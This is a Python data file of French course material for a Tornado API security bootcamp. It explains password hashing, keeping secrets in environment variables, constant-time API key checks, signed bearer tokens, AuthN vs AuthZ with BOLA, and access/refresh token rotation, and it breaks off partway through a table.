"""
Manuel de Référence Approfondi — Enrichissement des Chapitres (Jours 4 et 5) — Volume III : Édition Tornado.
Fournit pour chaque chapitre :
- context : exposé complet de la problématique d'ingénierie
- deep_sections : sous-chapitres de cours détaillés (fondements théoriques et mécanismes internes)
- architecture_diagram : schéma ASCII de flux mémoire ou réseau
- reference_table : tableau de synthèse technique
- pitfalls : anti-patterns de production vs standards industriels
- practical_exercises : exercices progressifs de révision post-bootcamp
"""

ENRICHMENT_D4_D5 = {
    # =========================================================================
    # JOUR 4 — CHAPITRE 4.1 : CRYPTOGRAPHIE APPLIQUÉE, VARIABLES D'ENVIRONNEMENT & API KEYS
    # =========================================================================
    "d4-l1": {
        "context": (
            "Dès qu'une API dépasse le stade d'un prototype local, elle manipule des ressources sensibles : dossiers RH, "
            "données financières, inscriptions officielles ou opérations d'administration. Ouvrir ces endpoints sans "
            "mécanisme de contrôle d'accès revient à laisser la salle des serveurs ouverte sur la rue.\n"
            "Pourtant, la majorité des failles de sécurité en entreprise ne proviennent pas d'attaques cryptographiques "
            "complexes, mais de **trois erreurs d'architecture fondamentales** :\n"
            "1. Confondre **encodage** (Base64), **hachage irréversible** (SHA-256 / PBKDF2) et **chiffrement** (AES).\n"
            "2. Écrire des clés secrètes ou mots de passe en dur dans le code source Python (`git commit`), les exposant "
            "définitivement dans l'historique du dépôt Git.\n"
            "3. Comparer des secrets avec l'opérateur standard `==`, ouvrant la porte aux **attaques temporelles (Timing Attacks)**.\n"
            "Ce chapitre pose les fondations cryptographiques rigoureuses indispensables à tout ingénieur backend Tornado."
        ),
        "deep_sections": [
            {
                "heading": "1. La distinction fondamentale : Encodage vs Hachage vs Chiffrement vs Signature HMAC",
                "body": (
                    "En ingénierie de sécurité, quatre opérations mathématiques sont régulièrement confondues par les développeurs débutants :\n"
                    "- **L'Encodage (ex: `Base64`, `UTF-8`, `URL-encoding`)** : N'a **aucune vocation de sécurité**. Son unique "
                    "but est de représenter des données binaires sous forme de caractères ASCII imprimables pour qu'elles traversent "
                    "sans corruption les protocoles textuels comme HTTP ou JSON. N'importe qui peut décoder du Base64 instantanément sans clé.\n"
                    "- **Le Hachage cryptographique (ex: `SHA-256`, `PBKDF2`, `bcrypt`, `Argon2`)** : Est une **fonction à sens unique (irréversible)**. "
                    "À partir d'une entrée de taille quelconque, elle produit une empreinte de taille fixe (64 caractères hexadécimaux pour SHA-256). "
                    "Il est mathématiquement impossible de retrouver le mot de passe d'origine à partir de son empreinte. Pour vérifier un mot de passe, "
                    "on hache la saisie de l'utilisateur et on compare les deux empreintes.\n"
                    "- **Le Salage (`Salt`) et dérivation lente (`PBKDF2` / `scrypt`)** : Si deux utilisateurs choisissent le même mot de passe, "
                    "leur hash SHA-256 brut sera identique, permettant les attaques par tables précalculées (*Rainbow Tables*). On ajoute donc "
                    "un **sel aléatoire unique** par mot de passe et on répète le hachage des centaines de milliers de fois (`hashlib.pbkdf2_hmac` "
                    "de la bibliothèque standard) pour ralentir toute tentative de force brute par carte graphique (GPU).\n"
                    "- **La Signature HMAC (`Hash-based Message Authentication Code`)** : Combine un message et une **clé secrète serveur** "
                    "via une fonction de hachage pour prouver que le message n'a pas été falsifié en chemin."
                )
            },
            {
                "heading": "2. La règle n°3 de la méthodologie Twelve-Factor App : Externalisation des Secrets (`os.environ`)",
                "body": (
                    "Un code source applicatif est destiné à être partagé entre développeurs, audité dans GitLab/GitHub et analysé par des "
                    "outils d'intégration continue (CI/CD). Si une clé d'API (`cookie_secret`, `SECRET_KEY`, mot de passe PostgreSQL) est écrite "
                    "dans un fichier `.py`, même si vous la supprimez dans un commit ultérieur, **elle reste lisible à jamais dans l'historique Git (`git log -p`)**.\n"
                    "- La norme industrielle impose de stocker les secrets dans les **variables d'environnement du système d'exploitation**.\n"
                    "- En Python, le dictionnaire `os.environ` (du module standard `os`) permet de lire ces variables injectées au démarrage du "
                    "conteneur Docker ou du service `systemd` : `os.environ.get(\"API_SECRET_KEY\")`.\n"
                    "- En développement local uniquement, on utilise une valeur de secours (*fallback*) explicite ou un fichier `.env` ignoré par Git (`.gitignore`)."
                )
            },
            {
                "heading": "3. Authentification Machine-to-Machine par `X-API-Key` et parade aux Timing Attacks (`hmac.compare_digest`)",
                "body": (
                    "Lorsqu'un serveur partenaire (ex: le système de facturation d'une filiale) interroge votre API Tornado sans intervention humaine, "
                    "le modèle le plus direct consiste à lui attribuer une **clé d'API (`API Key`)** transmise dans un en-tête HTTP dédié comme `X-API-Key`.\n"
                    "- **Pourquoi ne jamais passer l'API Key dans l'URL (`?api_key=secret`) ?** Parce que les URLs complètes sont enregistrées en clair "
                    "dans les journaux d'accès (logs Nginx, proxies d'entreprise, historique navigateur).\n"
                    "- **Pourquoi `if cle_recue == cle_attendue:` est une faille critique ?** L'opérateur `==` compare les chaînes caractère par caractère "
                    "et s'arrête dès la première différence (court-circuit). En mesurant le temps de réponse du serveur à la nanoseconde près sur des "
                    "milliers de requêtes, un attaquant devine le premier caractère, puis le deuxième, et reconstitue toute la clé.\n"
                    "- **La solution `hmac.compare_digest(a, b)`** : Cette fonction du module standard `hmac` compare tous les octets en **temps constant**, "
                    "quel que soit le nombre de caractères exacts, neutralisant totalement l'attaque temporelle."
                )
            }
        ],
        "architecture_diagram": (
            "FLUX DE VÉRIFICATION D'IDENTITÉ MACHINE (X-API-KEY) & MOT DE PASSE SALÉ\n"
            "========================================================================\n\n"
            "  [1] VÉRIFICATION D'UNE CLÉ D'API EN TEMPS CONSTANT :\n"
            "  Client HTTP                                     Serveur Tornado (RequestHandler)\n"
            "  En-tête : X-API-Key: isgp-live-98a7...  ----->  cle_client = self.request.headers.get('X-API-Key')\n"
            "                                                  cle_serveur = os.environ.get('PARTNER_API_KEY')\n"
            "                                                        |\n"
            "                                                  hmac.compare_digest(cle_client, cle_serveur)\n"
            "                                                  (Durée d'exécution constante : 0 fuite temporelle)\n\n"
            "  [2] STOCKAGE IRRÉVERSIBLE D'UN MOT DE PASSE UTILISATEUR (PBKDF2-HMAC-SHA256) :\n"
            "  Mot de passe clair : \"Formation2026!\"\n"
            "        +\n"
            "  Sel aléatoire (16 octets) : \"8f3d9a1c...\"\n"
            "        |\n"
            "        v  (600 000 itérations de hachage SHA-256)\n"
            "  Empreinte stockée en BDD : \"pbkdf2:sha256:600000$8f3d9a1c$e4b9012f8a...\" (Irréversible)"
        ),
        "reference_table": {
            "title": "Comparatif des Mécanismes Cryptographiques en Architecture API",
            "headers": ["Mécanisme Cryptographique", "Réversibilité", "Clé Secrète Requise ?", "Fonction Python Standard", "Cas d'Usage en Architecture API"],
            "rows": [
                ["Encodage Base64", "Oui (immédiate, publique)", "Non", "`base64.urlsafe_b64encode()`", "Transport de données binaires ou JSON dans un en-tête HTTP"],
                ["Hachage rapide (SHA-256)", "Non (irréversible)", "Non", "`hashlib.sha256(data).hexdigest()`", "Empreinte d'intégrité d'un fichier ou d'une clé d'API haute entropie"],
                ["Hachage lent salé (PBKDF2)", "Non (irréversible + lent)", "Non (Sel aléatoire inclus)", "`hashlib.pbkdf2_hmac('sha256', ...)`", "Stockage sécurisé des mots de passe humains en base de données"],
                ["Signature HMAC-SHA256", "Non (vérification par recalcul)", "Oui (Clé secrète serveur)", "`hmac.new(key, msg, hashlib.sha256)`", "Signature de jetons JWT/Bearer, `set_secure_cookie` et Webhooks"],
                ["Comparaison à temps constant", "N/A (Opérateur booléen)", "N/A", "`hmac.compare_digest(val1, val2)`", "Comparaison sécurisée de deux secrets (contre les Timing Attacks)"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Stocker les mots de passe avec `hashlib.md5()` ou `sha256()` sans sel",
                "good": "Utiliser une fonction de dérivation lente avec salage automatique (`hashlib.pbkdf2_hmac` avec 600 000 itérations)",
                "why": "Les cartes graphiques (GPU) calculent plus de 50 milliards d'empreintes SHA-256 par seconde et cassent les mots de passe courants instantanément sans sel ni itérations lentes."
            },
            {
                "bad": "Passer la clé d'API dans les paramètres de requête URL (`GET /api/rapports?api_key=secret123`)",
                "good": "Transmettre systématiquement les clés et jetons dans les en-têtes HTTP (`X-API-Key` ou `Authorization`)",
                "why": "Les URLs complètes sont archivées en clair dans les fichiers `access.log` de tous les serveurs mandataires et dans l'historique navigateur."
            },
            {
                "bad": "Écrire `SECRET_KEY = 'mon_secret_de_prod'` directement dans `app.py` et pousser sur Git",
                "good": "Lire les secrets exclusivement depuis l'environnement système via `os.environ.get('TORNADO_COOKIE_SECRET')`",
                "why": "Tout secret commité dans Git reste lisible indéfiniment dans l'historique `git log -p` même après suppression."
            }
        ],
        "practical_exercises": [
            "Générez deux empreintes successives du même mot de passe `\"Bootcamp2026\"` avec `hacher_mot_de_passe(\"Bootcamp2026\")` et affichez-les : expliquez pourquoi les deux chaînes obtenues sont totalement différentes et comment `verifier_mot_de_passe()` parvient malgré tout à valider les deux.",
            "Créez un dictionnaire serveur associant trois clés d'API à trois noms d'applications partenaires, puis écrivez un `RequestHandler` qui identifie quel partenaire appelle l'API."
        ]
    },

    # =========================================================================
    # JOUR 4 — CHAPITRE 4.2 : JETONS SIGNÉS (BEARER TOKENS / JWT) & EXPIRATION
    # =========================================================================
    "d4-l2": {
        "context": (
            "Lorsqu'un utilisateur humain se connecte depuis une application mobile ou une interface React/Vue, "
            "on ne peut pas lui demander de ressaisir son mot de passe à chaque clic, ni stocker son mot de passe "
            "en clair dans la mémoire du téléphone.\n"
            "Dans une architecture d'API moderne distribuée sur 4 ou 50 instances Tornado derrière un répartiteur de charge "
            "(Load Balancer Nginx), partager la mémoire RAM entre les processus serveurs devient un goulot d'étranglement.\n"
            "La solution standard de l'industrie est l'authentification **Stateless par Jeton Signé (`Bearer Token` / `JWT`)** : "
            "après avoir vérifié le mot de passe une seule fois sur `POST /api/auth/token`, le serveur délivre au client un "
            "**passeport numérique infalsifiable et limité dans le temps**."
        ),
        "deep_sections": [
            {
                "heading": "1. Anatomie complète d'un jeton signé (Modèle JWT : `Header.Payload.Signature`)",
                "body": (
                    "Un jeton signé standard (comme un **JWT — JSON Web Token**, RFC 7519, ou un jeton signé `itsdangerous`) "
                    "est composé de segments encodés en Base64URL séparés par des points `.` :\n"
                    "1. **Le `Header` (En-tête)** : Décrit les métadonnées cryptographiques, notamment l'algorithme de signature utilisé (ex: `HS256` pour HMAC-SHA256).\n"
                    "2. **Le `Payload` (Charge utile / `Claims`)** : Contient les déclarations d'identité et de droits de l'utilisateur sous forme d'objet JSON : "
                    "`sub` (Subject : identifiant unique de l'utilisateur), `role` (`admin`, `formateur`), `iat` (*Issued At* : horodatage d'émission) et "
                    "`exp` (*Expiration Time* : horodatage limite de validité).\n"
                    "3. **La `Signature` cryptographique** : Le serveur calcule `HMAC_SHA256(Base64(Header) + \".\" + Base64(Payload), SECRET_KEY)`. "
                    "Seul le serveur possède la `SECRET_KEY` en mémoire vive."
                )
            },
            {
                "heading": "2. Vérité cruciale : Un jeton signé est LISIBLE par tous, mais INFALSIFIABLE (`Signé != Chiffré`)",
                "body": (
                    "C'est l'erreur de compréhension la plus fréquente lors des entretiens techniques et en production :\n"
                    "- Le `Payload` d'un jeton JWT est simplement **encodé en Base64URL**, il n'est **PAS chiffré**.\n"
                    "- Si vous copiez un jeton JWT sur un outil ou que vous exécutez `base64.urlsafe_b64decode()`, vous lirez en clair "
                    "`{\"user_id\": 42, \"role\": \"lecteur\"}` sans avoir besoin de la clé secrète.\n"
                    "- **Conséquence n°1 (Confidentialité)** : Ne mettez **JAMAIS** de données secrètes (mot de passe, numéro de carte bancaire, clé privée) "
                    "à l'intérieur du Payload d'un jeton.\n"
                    "- **Conséquence n°2 (Intégrité)** : Pourquoi un attaquant ne peut-il pas décoder son jeton, remplacer `\"lecteur\"` par `\"admin\"`, "
                    "et le ré-encoder en Base64 ? Parce que dès qu'un seul bit du Payload change, la signature HMAC recalculée par le serveur "
                    "ne correspondra plus à la signature attachée au jeton (`401 Unauthorized`)."
                )
            },
            {
                "heading": "3. Le protocole d'échange `Authorization: Bearer <token>` dans un `RequestHandler` Tornado",
                "body": (
                    "Le standard HTTP (RFC 6750) définit la manière exacte dont le client présente son jeton à chaque requête :\n"
                    "- Le client ajoute l'en-tête HTTP : `Authorization: Bearer <jeton_signe>`.\n"
                    "- Le mot-clé `Bearer` signifie littéralement **« Au porteur »** : quiconque détient ce jeton valide est considéré comme authentifié "
                    "(d'où l'obligation absolue d'utiliser HTTPS en production pour empêcher l'écoute réseau).\n"
                    "- Côté Tornado, le `RequestHandler` lit `self.request.headers.get(\"Authorization\", \"\")`, extrait le jeton après `\"Bearer \"`, "
                    "et vérifie simultanément la signature cryptographique HMAC et l'horodatage d'expiration."
                )
            }
        ],
        "architecture_diagram": (
            "CYCLE DE VIE D'UN JETON SIGNÉ STATELESS (BEARER TOKEN / JWT) DANS TORNADO\n"
            "=========================================================================\n\n"
            "  [ÉTAPE 1 : CONNEXION INITIALE (POST /api/auth/token -> TokenIssueHandler)]\n"
            "  Client Mobile / Web                              Serveur Tornado (Stateless)\n"
            "  {\"identifiant\": \"amine\", \"mot_de_passe\": \"...\"} -> 1. Vérifie le mot de passe\n"
            "                                                   2. Crée Payload {\"sub\": \"amine\", \"role\": \"admin\"}\n"
            "                                                   3. Signe avec SECRET_KEY + Timestamp actuel\n"
            "  Stocke le token en mémoire               <-----  200 OK : {\"access_token\": \"eyJ...Signature\"}\n\n"
            "  [ÉTAPE 2 : REQUÊTE SUR ROUTE PROTÉGÉE (GET /api/auth/profil -> ProfilHandler)]\n"
            "  En-tête HTTP :\n"
            "  Authorization: Bearer eyJ...Signature     -----> 1. Extrait la chaîne après \"Bearer \"\n"
            "                                                   2. Recalcule HMAC(Payload, SECRET_KEY)\n"
            "                                                   3. Vérifie Horodatage <= max_age\n"
            "  Reçoit les données métier                <-----  200 OK (Aucune requête SQL de session requise !)"
        ),
        "reference_table": {
            "title": "États de Validation d'un Jeton Signé (`Bearer Token`)",
            "headers": ["Scénario de Vérification du Jeton", "Exception Levée (`itsdangerous`)", "Code HTTP Standard", "Cause Technique Exacte", "Action Attendue du Client"],
            "rows": [
                ["En-tête `Authorization` absent ou sans préfixe `Bearer `", "Aucune (rejet pré-vérification)", "`401 Unauthorized`", "Le client n'a fourni aucune preuve d'identité valide", "Rediriger vers l'écran de connexion (`/api/auth/token`)"],
                ["Signature valide et âge <= `max_age`", "Aucune (Succès)", "`200 OK`", "Jeton authentique, intègre et non expiré", "Exploiter la réponse JSON normalement"],
                ["Signature valide mais âge > `max_age`", "`SignatureExpired`", "`401 Unauthorized`", "Le jeton a dépassé sa durée de vie autorisée", "Utiliser le `refresh_token` ou demander une reconnexion"],
                ["Payload modifié ou signé avec une mauvaise clé", "`BadSignature`", "`401 Unauthorized`", "Tentative de falsification du Payload ou rotation de `SECRET_KEY`", "Purger le jeton local et forcer la reconnexion"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Stocker des informations confidentielles (mot de passe, clé interne) dans le Payload d'un jeton signé",
                "good": "Ne stocker dans le Payload que les identifiants publics nécessaires au contrôle d'accès (`sub`, `role`, `scopes`)",
                "why": "Un jeton signé est encodé en Base64URL et non chiffré : quiconque possède le jeton peut lire son Payload en clair sans clé."
            },
            {
                "bad": "Émettre des jetons sans date d'expiration (ou valables 1 an)",
                "good": "Imposer une durée de vie courte sur les jetons d'accès (`max_age=900` à `3600` secondes)",
                "why": "Un jeton Stateless ne pouvant pas être annulé sans état serveur, limiter sa durée de vie réduit la fenêtre d'exposition en cas d'interception."
            },
            {
                "bad": "Placer `except BadSignature:` avant `except SignatureExpired:` dans le bloc `try / except`",
                "good": "Toujours placer `except SignatureExpired:` **avant** `except BadSignature:`",
                "why": "`SignatureExpired` est une sous-classe de `BadSignature` ; si `BadSignature` est testé en premier, il capture aussi les jetons expirés."
            }
        ],
        "practical_exercises": [
            "Prenez un jeton généré par la route `POST /api/auth/token`, modifiez un seul caractère au milieu de la chaîne, puis envoyez-le dans `Authorization: Bearer ...` : observez comment le serveur Tornado détecte l'altération.",
            "Modifiez `ProfilProtegeHandler` pour renvoyer également dans la réponse JSON l'horodatage d'émission du jeton."
        ]
    },

    # =========================================================================
    # JOUR 4 — CHAPITRE 4.3 : AUTHENTIFICATION (AUTHN / 401) VS AUTORISATION (AUTHZ / 403, RBAC, SCOPES, BOLA)
    # =========================================================================
    "d4-l3": {
        "context": (
            "Dans la gestion des APIs (*API Management*) et la sécurité applicative, la confusion entre "
            "**Authentification (`AuthN`)** et **Autorisation (`AuthZ`)** est à l'origine de la faille n°1 mondiale "
            "du classement **OWASP API Security Top 10** : les failles d'autorisation (`BOLA` — *Broken Object Level Authorization* "
            "et `BFLA` — *Broken Function Level Authorization*).\n"
            "Trop souvent, les développeurs vérifient uniquement que l'utilisateur possède un jeton valide (`AuthN`), "
            "puis exécutent la requête sans vérifier si cet utilisateur précis a le **droit métier (`AuthZ`)** d'effectuer "
            "cette action ou de consulter cet enregistrement spécifique. Ce chapitre établit une séparation chirurgicale "
            "entre l'identité (`401`) et la permission (`403`) à travers les trois piliers de l'autorisation moderne : "
            "**RBAC**, **Scopes OAuth2** et **Propriété de la ressource (Anti-BOLA)**."
        ),
        "deep_sections": [
            {
                "heading": "1. `AuthN` (Qui êtes-vous ? -> `401`) vs `AuthZ` (Que pouvez-vous faire ? -> `403`)",
                "body": (
                    "Pour mémoriser définitivement la différence, prenons l'analogie d'un **ministère ou d'un siège d'entreprise sécurisé** :\n"
                    "- **L'Authentification (`AuthN`) — Le contrôle d'identité au portique d'entrée** : Vous présentez votre carte nationale "
                    "d'identité ou votre badge nominatif. L'agent de sécurité vérifie que la carte n'est pas falsifiée et qu'elle n'est pas expirée. "
                    "Si vous n'avez pas de badge ou qu'il est expiré, l'agent ignore qui vous êtes : c'est le code HTTP **`401 Unauthorized`** "
                    "(qui signifie en réalité *Unauthenticated* dans la spécification RFC 9110).\n"
                    "- **L'Autorisation (`AuthZ`) — Les droits d'accès aux portes internes** : Une fois entré dans le bâtiment avec votre badge "
                    "valide de *Stagiaire*, vous tentez d'ouvrir la porte de la *Salle des Coffres Financiers*. Le lecteur optique reconnaît "
                    "parfaitement votre identité (`AuthN` réussie !), mais consulte la matrice des permissions et constate que le statut *Stagiaire* "
                    "n'a pas l'habilitation requise. Se reconnecter avec le même badge ne changera rien : c'est le code HTTP **`403 Forbidden`**.\n"
                    "- **Règle d'architecture absolue** : L'Autorisation (`AuthZ`) s'exécute **toujours après** l'Authentification (`AuthN`). On ne peut "
                    "pas évaluer les permissions d'un appelant anonyme non identifié."
                )
            },
            {
                "heading": "2. Les 3 niveaux d'Autorisation (`AuthZ`) en API Management : RBAC, Scopes OAuth2 et Anti-BOLA",
                "body": (
                    "Une architecture d'API professionnelle combine trois niveaux complémentaires de contrôle d'autorisation :\n"
                    "1. **Niveau 1 — `RBAC` (*Role-Based Access Control* / Contrôle par Rôle)** : L'accès aux fonctionnalités sensibles est "
                    "conditionné par le rôle global de l'utilisateur (`stagiaire`, `formateur`, `admin`). Exemple : seul le rôle `admin` "
                    "peut appeler `DELETE /api/formations/<id>`.\n"
                    "2. **Niveau 2 — `Scopes` OAuth2 (Permissions granulaires déléguées)** : On restreint le jeton à une liste de **Scopes** "
                    "explicites comme `[\"dossiers:read\"]` sans `\"audit:admin\"`. Même si le propriétaire du compte est `admin`, ce jeton "
                    "précis se verra opposer un `403 Forbidden` s'il tente une action hors de ses scopes.\n"
                    "3. **Niveau 3 — Contrôle de propriété de l'objet (`Anti-BOLA` / *Object-Level Authorization*)** : C'est la défense contre la "
                    "faille **OWASP API1:2023 (BOLA)**. Si le stagiaire `101` appelle `GET /api/dossiers/101`, il reçoit `200 OK`. Mais s'il "
                    "modifie l'URL en `GET /api/dossiers/102`, le `RequestHandler` doit impérativement vérifier "
                    "`self.current_user[\"sub\"] == dossier[\"proprietaire\"]` (ou `self.current_user[\"role\"] == \"admin\"`)."
                )
            },
            {
                "heading": "3. Implémentation d'un pipeline de sécurité multicouche dans Tornado (`self.current_user`)",
                "body": (
                    "Dans Tornado, chaque `RequestHandler` dispose de la propriété native `self.current_user` :\n"
                    "- **Étape 1 (Décorateur `@exiger_acces` ou `get_current_user(self)`)** : Extrait le jeton `Bearer`, vérifie la signature "
                    "cryptographique et stocke le Payload vérifié dans `self.current_user`. En cas d'échec, coupe immédiatement le cycle avec `401 Unauthorized`.\n"
                    "- **Étape 2 (Vérification RBAC & Scopes)** : Vérifie que `self.current_user[\"role\"]` appartient aux rôles autorisés et que le "
                    "scope requis figure dans `self.current_user[\"scopes\"]`. En cas d'échec, renvoie `403 Forbidden`.\n"
                    "- **Étape 3 (Vérification métier Anti-BOLA dans `get(self, id)`)** : Compare `self.current_user[\"sub\"]` avec "
                    "le champ `proprietaire` de l'enregistrement avant de retourner ou modifier la ressource."
                )
            }
        ],
        "architecture_diagram": (
            "PIPELINE DÉCISIONNEL : AUTHENTIFICATION (401) VS AUTORISATION (403)\n"
            "===================================================================\n\n"
            "  Requête HTTP : GET /api/dossiers/102\n"
            "        |\n"
            "        v\n"
            "  +-------------------------------------------------------------------+\n"
            "  | ÉTAPE 1 : AUTHENTIFICATION (AuthN — Qui est l'appelant ?)         |\n"
            "  | Le jeton Bearer est-il présent, authentique (HMAC) et non expiré ?|\n"
            "  +-------------------------------------------------------------------+\n"
            "        | NON                                     | OUI (ex: sub=\"stagiaire_101\", role=\"stagiaire\")\n"
            "        v                                         v\n"
            "  [ 401 UNAUTHORIZED ]            +-------------------------------------------------------------------+\n"
            "  \"Identité inconnue ou expirée.  | ÉTAPE 2 : AUTORISATION (AuthZ — A-t-il le droit d'agir ?)         |\n"
            "   Veuillez vous authentifier.\"   | 2a. RBAC   : Le rôle est-il autorisé sur cette route ?            |\n"
            "                                  | 2b. SCOPES : Le jeton possède-t-il le scope 'dossiers:read' ?     |\n"
            "                                  | 2c. BOLA   : Est-il propriétaire ('stagiaire_101' == '102') ?     |\n"
            "                                  +-------------------------------------------------------------------+\n"
            "                                        | NON                                     | OUI\n"
            "                                        v                                         v\n"
            "                                  [ 403 FORBIDDEN ]                         [ 200 OK / ACTION EXÉCUTÉE ]\n"
            "                                  \"Identité reconnue (stagiaire_101), mais\n"
            "                                   droits insuffisants pour cet objet.\""
        ),
        "reference_table": {
            "title": "Matrice de Séparation : Authentification (`AuthN`) vs Autorisation (`AuthZ`) vs Anti-BOLA",
            "headers": ["Dimension Comparée", "Authentification (`AuthN`)", "Autorisation (`AuthZ`)", "Protection Anti-BOLA (OWASP #1)"],
            "rows": [
                ["Question posée par le serveur", "« Qui êtes-vous ? Prouvez votre identité. »", "« Avez-vous la permission d'exécuter cette action ? »", "« Cet enregistrement précis vous appartient-il ? »"],
                ["Éléments inspectés", "En-tête `Authorization: Bearer`, signature HMAC, expiration `exp`", "Attributs `role` (RBAC) et `scopes` (OAuth2) du jeton", "Comparaison `self.current_user['sub'] == ressource['proprietaire']`"],
                ["Code HTTP en cas d'échec", "`401 Unauthorized` (+ en-tête `WWW-Authenticate`)", "`403 Forbidden`", "`403 Forbidden` (ou `404` pour masquer l'existence)"],
                ["Action corrective côté client", "Se connecter (`POST /api/auth/login`) ou rafraîchir le jeton", "Demander une élévation de privilèges à l'administrateur", "Aucune : accès illégitime aux données d'un tiers bloqué"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Renvoyer `401 Unauthorized` lorsqu'un utilisateur connecté avec le rôle `stagiaire` tente d'accéder à `/api/admin`",
                "good": "Renvoyer `401` uniquement si l'identité est absente/invalide, et `403 Forbidden` si les permissions sont insuffisantes",
                "why": "Les applications frontales interprètent `401` comme une expiration de session et déconnectent l'utilisateur ou bouclent sur `/refresh`."
            },
            {
                "bad": "Masquer le bouton « Supprimer » dans l'interface React/mobile sans vérifier le rôle et le propriétaire côté serveur Tornado",
                "good": "Appliquer systématiquement les contrôles `AuthZ` (RBAC, Scopes et Anti-BOLA) dans le code Python du `RequestHandler`",
                "why": "Un attaquant utilise `curl` directement et contourne totalement l'interface graphique du navigateur."
            },
            {
                "bad": "Vérifier que le jeton est valide sur `GET /api/dossiers/([0-9]+)` sans vérifier à qui appartient le dossier",
                "good": "Comparer systématiquement `self.current_user['sub'] == dossier['proprietaire']` (ou `self.current_user['role'] == 'admin'`)",
                "why": "L'absence de contrôle de propriété sur l'objet (BOLA / IDOR) permet à tout utilisateur connecté d'aspirer les dossiers de tous les autres utilisateurs."
            }
        ],
        "practical_exercises": [
            "Exécutez le script `day_4/04_refresh_token_et_rbac.py` pour observer les 5 scénarios de test couvrant `200`, `401` et `403` (RBAC et Anti-BOLA).",
            "Écrivez une fonction de contrôle `verifier_acces_document(identite_jeton, document)` qui autorise la lecture si l'utilisateur est propriétaire du document, s'il appartient au même département avec le rôle `manager`, ou s'il est `admin`."
        ]
    },

    # =========================================================================
    # JOUR 4 — CHAPITRE 4.4 : ROTATION ACCESS / REFRESH TOKENS & DÉCORATEUR @EXIGER_ACCES
    # =========================================================================
    "d4-l4": {
        "context": (
            "Nous avons vu au chapitre 4.2 qu'un jeton Stateless (`Access Token`) ne peut pas être facilement annulé "
            "avant sa date d'expiration sans consulter une base de données. Cela pose un dilemme d'architecture :\n"
            "- Si on fixe la durée de vie de l'`Access Token` à **30 jours**, l'utilisateur reste connecté confortablement, "
            "mais si son jeton est volé ou si un employé quitte l'entreprise, il conserve un accès complet pendant un mois.\n"
            "- Si on fixe la durée de vie de l'`Access Token` à **15 minutes**, la sécurité est maximale, mais déconnecter "
            "l'utilisateur toutes les 15 minutes en lui redemandant son mot de passe détruit l'expérience utilisateur.\n"
            "L'industrie résout ce paradoxe grâce à l'**architecture à double jeton (`Access Token` court + `Refresh Token` long)** "
            "couplée à une **liste de révocation (`Token Blacklist`)** et à des **décorateurs de méthodes `RequestHandler` (`@exiger_acces`)**."
        ),
        "deep_sections": [
            {
                "heading": "1. Le duo `Access Token` (15 min, Stateless) et `Refresh Token` (7 à 30 jours, Révocable)",
                "body": (
                    "Lors d'une authentification réussie sur `POST /api/auth/login`, le `LoginHandler` Tornado émet **deux jetons distincts** "
                    "(signés avec deux sels cryptographiques différents `salt=\"access-token\"` et `salt=\"refresh-token\"`) :\n"
                    "1. **L'`Access Token` (durée très courte : 5 à 15 minutes)** : C'est le jeton envoyé à chaque requête métier "
                    "(`GET /api/dossiers/101`). Sa vérification est purement cryptographique (ultra-rapide, en RAM).\n"
                    "2. **Le `Refresh Token` (durée longue : 7 à 30 jours)** : Ce jeton ne permet d'appeler **aucune route métier**. "
                    "Son unique utilité est d'être présenté à `POST /api/auth/refresh` lorsque l'`Access Token` vient "
                    "d'expirer, afin d'obtenir silencieusement un nouvel `Access Token` tout neuf de 15 minutes sans redemander le mot de passe."
                )
            },
            {
                "heading": "2. Révocation immédiate (`Blacklist` / Redis) et Rotation des Refresh Tokens",
                "body": (
                    "Que se passe-t-il si un utilisateur clique sur « Se déconnecter » ou si l'équipe de sécurité détecte une compromission ?\n"
                    "- On envoie le `Refresh Token` à `POST /api/auth/revoke` (ou `/logout`). Le serveur ajoute son identifiant unique `jti` "
                    "à une **liste noire (`REFRESH_TOKENS_REVOQUES`)** stockée en production dans **Redis**.\n"
                    "- Dès lors, même si la signature cryptographique du `Refresh Token` est encore mathématiquement valide, `RefreshHandler` "
                    "vérifie s'il figure dans `REFRESH_TOKENS_REVOQUES` et bloque net toute émission de nouvel `Access Token`."
                )
            },
            {
                "heading": "3. Factoriser la sécurité avec une usine à décorateurs Python (`@exiger_acces`) sur `RequestHandler`",
                "body": (
                    "Copier-coller 25 lignes de lecture d'en-tête `Authorization`, de `try / except SignatureExpired` et de vérification de rôle "
                    "au début de chacune des 80 méthodes `get()`/`post()` d'une API viole le principe **DRY (*Don't Repeat Yourself*)**.\n"
                    "- En Python, un **décorateur paramétré** `@exiger_acces(roles_autorises=(\"admin\",), scope_requis=\"audit:admin\")` "
                    "enveloppe la méthode `def delete(self, *args, **kwargs):` du `RequestHandler`.\n"
                    "- Si le jeton est valide et autorisé, le décorateur peuple `self.current_user = payload` et appelle la méthode cible."
                )
            }
        ],
        "architecture_diagram": (
            "CYCLE DE ROTATION ACCESS TOKEN / REFRESH TOKEN & RÉVOCATION DANS TORNADO\n"
            "========================================================================\n\n"
            "  Client                                      Serveur Tornado\n"
            "  1. POST /api/auth/login              -----> LoginHandler vérifie identifiants\n"
            "     Reçoit Access (15m) + Refresh (7j)<----- Signe Access (salt='access') & Refresh (salt='refresh')\n"
            "        |\n"
            "  2. GET /api/dossiers/101 (Pendant 15m) ---> @exiger_acces vérifie Access Token -> 200 OK\n"
            "        |\n"
            "  3. [16 minutes plus tard : Access Token expiré -> 401 SignatureExpired]\n"
            "        |\n"
            "  4. POST /api/auth/refresh            -----> RefreshHandler :\n"
            "     (Envoie le Refresh Token)                1. Vérifie signature avec salt='refresh'\n"
            "                                              2. Vérifie jti NOT IN REFRESH_TOKENS_REVOQUES\n"
            "     Reçoit un nouvel Access (15m)     <----- 3. Émet un nouvel Access Token frais"
        ),
        "reference_table": {
            "title": "Comparaison Technique : `Access Token` vs `Refresh Token`",
            "headers": ["Propriété Technique", "`Access Token` (Jeton d'accès)", "`Refresh Token` (Jeton de renouvellement)"],
            "rows": [
                ["Durée de vie typique (`max_age`)", "Courte : 5 à 15 minutes (`300` à `900` s)", "Longue : 7 à 30 jours (`604800` à `2592000` s)"],
                ["Sel cryptographique (`salt`)", "`\"access-token\"`", "`\"refresh-token\"` (Empêche l'utilisation croisée)"],
                ["Routes où il est accepté", "Toutes les routes métier protégées (`/api/...`)", "Uniquement `POST /api/auth/refresh` et `/api/auth/revoke`"],
                ["Mode de validation", "100% Stateless (Calcul HMAC en RAM)", "Stateful léger (HMAC + vérification de non-révocation `jti` en Redis/BDD)"],
